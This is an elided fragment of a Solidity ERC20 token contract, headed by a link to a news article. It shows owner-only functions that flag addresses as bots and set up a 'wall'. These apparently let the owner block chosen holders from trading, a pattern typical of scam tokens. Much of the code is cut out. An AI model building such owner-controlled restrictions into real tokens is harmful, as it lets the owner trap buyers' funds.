/*
https://www.sankei.com/article/20260325-23VP3EPM3FIGLEUXRM3B4QLUG4/
*/ 
...
contract Contract is Context, IERC20, Ownable {
  ...
  uint8 private constant _decimals = 9;
    ...
    function holdBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function releaseBots(address[] memory notbot) public onlyOwner {
    ...
    function hodlwall(address[] memory wallets) external onlyOwner {
    ...
    function enablewall() external onlyOwner {
